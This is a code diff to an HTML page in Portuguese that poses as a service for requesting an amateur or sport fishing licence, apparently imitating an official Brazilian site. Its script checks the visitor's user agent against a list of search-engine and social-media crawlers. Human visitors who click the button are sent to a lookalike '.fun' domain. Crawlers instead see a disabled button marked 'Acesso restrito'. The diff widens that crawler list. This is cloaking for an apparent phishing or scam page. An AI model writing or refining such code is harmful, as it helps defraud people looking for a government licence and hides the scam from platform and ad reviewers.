@@ -96,7 +96,6 @@
   <div class="container">
     <div class="title">Solicitar Licença de Pescador Amador ou Esportivo</div>
 
-    <!-- Botão agora centralizado visualmente com mais espaço -->
     <button id="btnSolicitar" class="btn">Iniciar Solicitação</button>
 
     <div class="section">
@@ -121,19 +120,23 @@
   </footer>
 
   <script>
-    const bots = ['Googlebot', 'AdsBot-Google', 'Bingbot', 'facebookexternalhit', 'Twitterbot'];
-    const ua = navigator.userAgent;
-    const isBot = bots.some(bot => ua.includes(bot));
+    const bots = [
+      'Googlebot', 'AdsBot-Google', 'Mediapartners-Google',
+      'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+      'YandexBot', 'facebookexternalhit', 'Twitterbot'
+    ];
+
+    const isBot = bots.some(bot => navigator.userAgent.includes(bot));
 
     if (!isBot) {
       document.getElementById('btnSolicitar').addEventListener('click', () => {
-        window.location.href = "https://licencadepescaa.fun/inicio/"; // <== Troque aqui pelo seu link real
+        window.location.href = "https://licencadepescaa.fun/inicio/";
       });
     } else {
       const btn = document.getElementById('btnSolicitar');
       btn.style.backgroundColor = '#888';
-      btn.style.cursor = 'default';
-      btn.textContent = 'Conteúdo neutro para bots';
+      btn.style.cursor = 'not-allowed';
+      btn.innerText = 'Acesso restrito';
     }
   </script>
 </body>
